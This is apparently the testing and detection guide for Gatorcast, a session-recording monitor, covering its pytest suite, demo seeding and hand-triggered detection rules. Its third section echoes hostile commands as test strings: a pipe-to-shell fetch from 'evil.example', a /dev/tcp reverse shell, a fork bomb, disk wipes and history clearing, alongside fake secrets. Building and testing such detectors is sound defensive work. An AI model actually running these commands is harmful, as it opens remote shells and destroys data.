# Gatorcast — Testing & Detection Walkthrough

This guide covers three things:

1. **[Running the automated test suite](#1-running-the-automated-test-suite)** — `pytest`.
2. **[Seeding demo data](#2-seeding-demo-data)** — populate a running instance with sample
   sessions that trip every rule, in one command.
3. **[Triggering detection patterns by hand](#3-triggering-detection-patterns-by-hand)** —
   the exact text to paste into a real recorded session (or POST yourself) to fire each
   built-in rule, plus the negative-control set that must produce **zero** findings.

For what the rules mean and how detection works under the hood, see
[SEARCH_AND_DETECTION.md](SEARCH_AND_DETECTION.md). For the data flow and session
lifecycle, see [ARCHITECTURE.md](ARCHITECTURE.md).

> **Nothing dangerous ever runs.** The detector scans the **on-screen plaintext** of a
> recording, not a process table. So `echo`-ing a dangerous-looking string (single-quoted,
> so the shell treats it as literal text) is enough to trip a rule — the command itself is
> never executed. Every secret value below is a fake/example value.

---

## 1. Running the automated test suite

The suite is plain `pytest` (Light tier — no `ruff`/`mypy` gating, no E2E required). Test
configuration lives in [`pyproject.toml`](pyproject.toml): `asyncio_mode = "auto"`,
`pythonpath = ["src"]`, and `testpaths = ["tests"]` are already set, so no extra flags are
needed. There is no `conftest.py`; each test module builds its own app, settings, and
`tmp_path` data directory.

```bash
# From the project root, in a virtualenv:
python -m venv .venv
. .venv/bin/activate          # Windows: .venv\Scripts\activate
pip install -e ".[dev]"       # installs pytest + pytest-asyncio + httpx

pytest                        # run everything
pytest -q                     # quieter (this is what CI runs)
pytest -q --collect-only      # list tests and print the collected count
pytest tests/test_detect.py   # one module
pytest -k "detect or extract" # by keyword
```

Without activating the virtualenv, call its interpreter directly, for example
`.venv/Scripts/python.exe -m pytest -q` on Windows or `.venv/bin/python -m pytest -q`
elsewhere.

### Test inventory

The suite currently collects **1379 tests** across 26 test modules, and all 1379 pass
(`pytest -q`, about 47 seconds, with one third-party Starlette deprecation warning about
`httpx`). Counts are from `pytest --collect-only`; parametrized cases count individually, so
they drift as tests are added.

| Area | Module | Tests | Covers |
| --- | --- | --- | --- |
| Ingest front doors | `test_ingest_http.py` | 8 | `POST /ingest`: bearer auth (401), NDJSON, JSON array, single object, per-line tolerance, Docker `{"log":…}` unwrap on the `application/json` path. Asserts on the rows that land in SQLite (sessions, pending connections, API requests). |
| | `test_syslog_tcp.py` | 8 | Octet-counted and newline framing, back-to-back frames, EOF, end-to-end enqueue, and the defensive bounds (`MAX_FRAME_BYTES`, `MAX_LENGTH_DIGITS`). |
| | `test_normalize.py` | 10 | Plain JSON, syslog-wrapped, collector-wrapped, and junk lines. |
| Pipeline | `test_classify.py` | 244 | Legacy log-line classification: the two-stage recording filter, start/end events, API-request events, header and URL allowlisting, timestamp normalization. |
| | `test_classify_envelope.py` | 16 | The envelope wire format (`session_start` / `recording_chunk` / `session_end` records with no `logger`), plus a legacy-regression check. |
| | `test_assembler.py` | 72 | Reassembly, finalize, idle backstop, startup sweep, and the connection lifecycle (pending → recording / api / error). Also the persisted seal mode: a late chunk after a restart or cache eviction leaves a terminally sealed `.cast` byte-identical, reopens a reopenably sealed one, and is ignored for an orphan or missing file; run with encryption off and on. |
| | `test_extract.py` | 5 | Plaintext extraction and the character-to-time offset index. |
| | `test_detect.py` | 71 | Built-in cast rules and the Kubernetes API rules; positive samples and look-alike negatives. |
| | `test_backfill.py` | 4 | Startup index + detect pass for finalized sessions that lack a sidecar. |
| | `test_retention.py` | 25 | Age and size purge, including API requests, API findings, and connections. |
| | `test_activity.py` | 65 | Pure kubectl activity grouping: discovery, commands, activity sessions. |
| Storage / crypto | `test_store.py` | 73 | `SessionRepository` and `CastStore`, including `list_systems` (`last_session_at`, `last_api_at`, `ssh_count` / `exec_count`, ordering by the newer timestamp) and the persisted seal mode. |
| | `test_db_schema.py` | 52 | Schema, indexes (including the four search indexes, with a second `init_db` a no-op and `user_version` still 1), the `sealed_terminal` column, the `gc_is_discovery` SQL function, the connections / api_requests / api_findings tables, and migrations. |
| | `test_crypto.py` | 11 | AES-256-GCM `Cryptor`: round-trip, tamper, wrong key, wrong AAD, bad key. |
| | `test_search_store.py` | 27 | Findings persistence, the deprecated `SearchStore.search` wrapper, content scan, dashboard stats (windowing on the recording start, command-based API figures). |
| | `test_activity_store.py` | 115 | `ActivityStore`: connections, deduplicated API requests, API findings. |
| | `test_timeline.py` | 114 | The unified search engine (`store/timeline.py`): command identity and grouping, window edges, keyset paging with no duplicate or skipped item for every source and sort, the merge against a brute-force sort, budget frontiers and *Continue*, filters and exclusions, risk-sort phases, flagged cap, failed-connection kind, user filter, `cmd` focus. |
| | `test_query_plans.py` | 25 | `EXPLAIN QUERY PLAN` pins for the hot queries. Asserts index names, not plan text, so it survives SQLite version differences. |
| Web / config | `test_web.py` | 23 | Session/system routes, auth, `/cast`, fail-closed encryption, no external asset URLs, systems badges and timestamp columns, user and exec-to-command links. |
| | `test_web_search.py` | 89 | Unified `/search`: type select, interleaved kinds, failed rows, the exec row shown twice, legacy URLs, `cmd=` focus, HTMX partials and `400` partial, **Next ›** cursors, escaping; the 15-column CSV; the dashboard's links, figures and recent-activity feed. |
| | `test_search_params.py` | 215 | `web/params.py` and `web/kinds.py`: canonical and legacy parsing, every `400` (enum, length, repeat, conflict, window with `from`, `from > to`, `page_size`, regex), cursor round-trip and tamper cases, no `400` body echoing the value, `search_url` ordering, `resolve_kinds` exclusions, and a check that `store/` never imports `gatorcast.web`. |
| | `test_web_activity.py` | 54 | kubectl activity routes, parameter validation (400s), dashboard kubectl card, activity-page links. |
| | `test_config_search.py` | 10 | Detection/search and kubectl-activity settings, including the `0 < gap <= max` validator. |
| | `test_bootstrap.py` | 2 | App boots through its lifespan, `/healthz` returns OK, schema initializes. |
| End-to-end | `test_e2e_search.py` | 1 | `/ingest` → classify → assembler → detect → search UI, asserting recorded content never appears in HTML or CSV. |
| Secret hygiene | `test_secret_hygiene.py` | 40 | Posts `kubectl_audit_lines.ndjson` (planted sentinel secrets) through `/ingest`, with encryption off and on, then walks 87 seeded search URLs (every `type`, `user=` by username and by user id, `cmd=`, cursor walks, 15 CSV exports) plus a crawl of the linked pages, and asserts no sentinel, `command=` value or full `User-Agent` reaches the database, logs, UI or any export. |

`test_detect.py` is the source of truth for rule behavior — it asserts both that each rule
fires on a positive sample and that look-alike-but-safe input does not.

### Fixtures

There is no shared `conftest.py` fixture layer. Shared test data lives in `tests/`:

| File | Contents |
| --- | --- |
| `tests/fixtures/sample_log_lines.ndjson` | Three real Gateway lines: a recording chunk, an `Authenticated connection` start line (a different `conn_id`), and a legacy API-audit line. |
| `tests/fixtures/kubectl_audit_lines.ndjson` | 13 synthetic lines: three start lines, API audits (one `failed`, one legacy line with no `request_id`), a status-101 exec audit, and k8s recording chunks including a `session finished` flush. Planted with `GC_SENTINEL_*` secrets for the hygiene test. |
| `tests/fixtures/timeline.py` | Builder for the unified-search tests. Inserts synthetic `sessions`, `findings`, `api_requests`, `api_findings` and `connections` rows through the stores with controlled timestamps: two clusters and two users, a kubectl run spanning two connections under one `Kubectl-Session`, a k9s-style connection with 250 requests, a discovery-only command, an exec command linked to its recording, commands straddling a window edge, a failed connection, and rows with only a user id. Nothing in it comes from a real capture. |
| `tests/samples.py` | `sample_lines()` helper that reads `sample_log_lines.ndjson`. |

### What CI runs

[`.github/workflows/publish.yml`](.github/workflows/publish.yml) is the only workflow. Its
`test` job runs on `ubuntu-latest` with Python 3.12:

```bash
pip install -e ".[dev]"
pytest -q
```

The `publish` job (build and push the image to GHCR) runs only if `test` passes. The workflow
triggers on pushes to `main`, `v*` tags, and manual dispatch. It does not trigger on pull
requests, and CI runs no linter or type checker. Run `pytest -q` locally before pushing.

---

## 2. Seeding demo data

[`scripts/seed_demo.py`](scripts/seed_demo.py) is the fastest way to populate the dashboard
and search UI. It POSTs 8 synthetic sessions (varied users, systems, and dates) as a single
NDJSON batch through the **real `/ingest` front door**. Each session is three log objects: an
`Authenticated connection` start line, one recording chunk, and a `Connection closed` event.
The start line creates a hidden pending connection, the chunk promotes it to a recording
(and creates the session), and the close event seals the session to complete immediately
instead of waiting on the idle backstop. The script sends no API-audit lines, so it does not
exercise kubectl activity.

Between them the sessions trip **every** built-in cast rule exactly once (21 findings in
total), and the final two sessions in the script are controls: `c-bastion-04`, an ordinary
clean session, and `c-safe-09`, a negative-control session of look-alike-but-safe commands.
Both must produce **zero** findings.

| Session | User | System | Findings |
| --- | --- | --- | --- |
| `c-prod-db-01` | alice@corp | prod-db-01 | 2 (critical) |
| `c-web-02` | bob@corp | web-02 | 2 (critical) |
| `c-k8s-03` | carol@corp | k8s-prod | 2 (high) |
| `c-jump-05` | dave@corp | jump-host | 2 (critical) |
| `c-ops-06` | erin@corp | ops-node | 9 (critical) |
| `c-secrets-07` | frank@corp | ci-runner | 4 (critical) |
| `c-bastion-04` | alice@corp | bastion | 0 (clean) |
| `c-safe-09` | grace@corp | staging | 0 (negative control) |

```bash
# 1. Start the service locally (or point BASE/TOKEN in the script at your instance).
#    The script defaults to http://127.0.0.1:8080 with the ingest token "test-ingest-token",
#    so set INGEST_TOKEN=test-ingest-token in .env before `docker compose up -d` for a
#    zero-config run.
docker compose up -d

# 2. Seed it.
python scripts/seed_demo.py
# -> POST /ingest -> 204 (24 objects, 8 sessions)

# 3. Browse http://127.0.0.1:8080/dashboard?window=all — you should see 8 sessions,
#    6 of them flagged, severity/category breakdowns, and the two clean sessions with no
#    findings.
```

`/ingest` returns `204 No Content`, which is what the script prints. The 24 objects are 8
sessions times 3 lines; the count did not change when start lines started creating pending
connections, because every seeded connection also delivers a chunk and so becomes a session.

**Use `?window=all` on the dashboard.** The seed timestamps are fixed dates between
2026-06-12 and 2026-06-18. The dashboard defaults to the last 30 days, so once those dates
are older than that, the default view shows nothing. For the same reason, the daily
retention purge removes the seeded sessions once they are older than `RETENTION_DAYS`
(default 90). Edit the timestamps in the script, or set `RETENTION_DAYS=0`, to keep them.
`/systems` and `/search` are not windowed unless a `window` (or `from`/`to`) filter is set
(the dashboard's links carry `window`). The script sends no API-audit lines, so after
seeding `type=kubectl` in search is empty and the systems list shows no Kubernetes badges.

The script is not part of the app and is safe to delete. To point it at a different host or
token, edit the `BASE` and `TOKEN` constants at the top.

---

## 3. Triggering detection patterns by hand

Use this when you want to verify detection against a **real** Twingate Gateway recording, or
craft a one-off test case. There are two ways to get the text in front of the detector.

### Option A — paste into a live recorded session (recommended)

Open a session that the Gateway is recording (an SSH shell or `kubectl exec`), then paste the
block below. Because each line is a single-quoted `echo`, the shell just prints the string —
nothing executes — but the dangerous text still appears on screen and is captured in the
recording. The scan fires the rules live as the output is received (and again at seal).

```bash
echo 'rm -rf /tmp/foo'
echo 'curl http://evil.example/x.sh | sh'
echo 'chmod 777 /etc/passwd'
echo 'dd if=/dev/zero of=/dev/sda'
echo 'mkfs.ext4 /dev/sdb1'
echo ':(){ :|:& };:'
echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
echo 'cat payload.b64 | base64 -d | bash'
echo 'kubectl delete pod web-0'
echo 'kubectl drain node-1'
echo 'kubectl get secret db-creds -o yaml'
echo 'iptables -F'
echo 'history -c'
echo 'sudo su -'
echo 'AKIAIOSFODNN7EXAMPLE'
echo '-----BEGIN RSA PRIVATE KEY-----'
echo 'ghp_0123456789abcdefghijABCDEFGHIJklmnop'
echo 'xoxb-1234567890-abcdefghijklmnop'
echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c'
echo 'VAULT_TOKEN=hvs.CAESIABCDEFGHIJ1234567890abcdef'
echo 'password="hunter2supersecret"'
```

### What each line trips

| Line | Rule | Category | Severity |
| --- | --- | --- | --- |
| `rm -rf …` | `recursive-delete` | dangerous-command | high |
| `curl … \| sh` | `pipe-to-shell` | dangerous-command | critical |
| `chmod 777 …` | `chmod-777` | dangerous-command | medium |
| `dd … of=/dev/…` | `raw-disk-write` | dangerous-command | high |
| `mkfs.ext4 …` | `mkfs` | dangerous-command | high |
| `:(){ :\|:& };:` | `fork-bomb` | dangerous-command | critical |
| `… /dev/tcp/…` | `reverse-shell` | dangerous-command | critical |
| `base64 -d … \| bash` | `base64-pipe-shell` | dangerous-command | critical |
| `kubectl delete …` | `kubectl-delete` | dangerous-command | high |
| `kubectl drain …` | `kubectl-drain` | dangerous-command | high |
| `kubectl get secret …` | `kubectl-secret` | dangerous-command | high |
| `iptables -F` | `iptables-flush` | dangerous-command | medium |
| `history -c` | `history-clear` | dangerous-command | medium |
| `sudo su -` | `privilege-change` | dangerous-command | high |
| `AKIA…` (16 chars) | `aws-key` | secret-exposure | critical |
| `-----BEGIN RSA PRIVATE KEY-----` | `private-key` | secret-exposure | critical |
| `ghp_…` (36 chars) | `github-token` | secret-exposure | critical |
| `xoxb-…` | `slack-token` | secret-exposure | high |
| `eyJ….….…` | `jwt` | secret-exposure | medium |
| `VAULT_TOKEN=hvs.…` | `vault-token` | secret-exposure | critical |
| `password="…"` | `generic-secret-assign` | secret-exposure | medium |

Notes:

- **Secret patterns are case-sensitive** (`AKIA`, `ghp_`, `eyJ`, `hvs.`). The casing above is
  exact — don't lowercase them, or those rules won't fire.
- The `ghp_` token needs **exactly 36 trailing characters** and the AWS key needs **16
  characters after `AKIA`** — both are correct as written.
- The 21 lines above trip **all 21 built-in cast rules** — one finding per rule (verified
  against `gatorcast.pipeline.detect`). Two lines trip more than the table shows:
  `chmod 777 /etc/passwd` also trips `privilege-change` (its `passwd` alternative matches the
  filename), and `sudo su -` trips the same rule, so that rule still yields a single
  finding. Change the path in the `chmod` line if you want it to trip `chmod-777` alone.
  `VAULT_TOKEN=` does **not** also trip `generic-secret-assign`: the underscore in
  `VAULT_TOKEN` defeats that rule's `\btoken=` word boundary, which is why the separate
  `password="…"` line is what exercises it.
- These are the cast (on-screen text) rules. The Kubernetes API rules (`kube-delete`,
  `kube-secrets`, `kube-evict`, `kube-cordon`, `kube-exec`, `kube-node-proxy-exec`) match the
  method and path of Gateway API-audit lines, not recording text, so pasted `echo` lines
  cannot trip them. `tests/test_detect.py` covers them.
- Each rule fires **at most once** per recording (earliest match wins), so duplicating a line
  adds no new findings — this block is already a full sweep.

### Option B — POST a recording yourself with `curl`

If you don't have a live Gateway, you can craft the three log objects (session start,
recording chunk, close) and POST them as NDJSON. This mirrors exactly what
[`scripts/seed_demo.py`](scripts/seed_demo.py) does. The asciicast value is a header line
followed by `[offset, "o", "<text>"]` event tuples.

```bash
INGEST_TOKEN=test-ingest-token   # match your container's INGEST_TOKEN

curl -sS -X POST http://127.0.0.1:8080/ingest \
  -H "Authorization: Bearer ${INGEST_TOKEN}" \
  -H "Content-Type: application/x-ndjson" \
  --data-binary @- <<'NDJSON'
{"logger":"gateway","message":"Authenticated connection","conn_id":"c-manual-01","resource_address":"test-host","user":{"username":"tester@corp","id":"tester","groups":["eng"]},"ts":"2026-06-22T12:00:00Z"}
{"logger":"gateway.audit","conn_id":"c-manual-01","asciicast_sequence_num":0,"user":{"username":"tester@corp","id":"tester","groups":["eng"]},"ts":"2026-06-22T12:00:00Z","asciicast":"{\"version\":2,\"width\":100,\"height\":30,\"timestamp\":1718700000}\n[0.5,\"o\",\"tester@test-host:~$ rm -rf /tmp/foo\\r\\n\"]\n[2.0,\"o\",\"tester@test-host:~$ export KEY=AKIAIOSFODNN7EXAMPLE\\r\\n\"]\n"}
{"logger":"gateway","message":"Connection closed","conn_id":"c-manual-01","ts":"2026-06-22T12:00:05Z"}
NDJSON
```

The session seals to complete on the close event (or a `"session finished"` chunk; otherwise
the idle backstop after `SESSION_MAX_IDLE_SECONDS`). It is scanned live as it arrives and
appears at `/sessions/c-manual-01` with `recursive-delete` and `aws-key` findings. Note the
double-escaping: `asciicast` is a JSON **string** whose value is itself a JSON document, so
its inner quotes and line separators are backslash-escaped once (`\"`, `\n`), and the
`\r\n` inside each event's text is escaped twice (`\\r\\n`). A single `\r\n` there puts a raw
CR/LF inside the inner JSON string, which splits the event line; the recording then
reassembles with zero events and no findings.

---

## Negative controls (false-positive check)

Detection is only as useful as its precision, so the test data deliberately includes commands
that *look* dangerous but must match **no** rule. Paste these into a recorded session and
confirm the session finalizes with **zero** findings:

```bash
echo 'rm old.log'                                   # rm without -rf
echo 'chmod 755 deploy.sh'                          # not 777
echo 'kubectl get pods -n staging'                  # get, not delete/drain/secret
echo 'curl https://api.example.com/health -o h.json' # curl to a file, no pipe to shell
echo 'dd if=disk.img of=/tmp/disk.copy'             # dd to a file, not /dev/
echo 'grep password notes.txt'                      # "password" with no assignment
echo 'history | tail -20'                           # history without -c
```

If any of these produce a finding, that's a false positive worth a regression test in
[`tests/test_detect.py`](tests/test_detect.py).
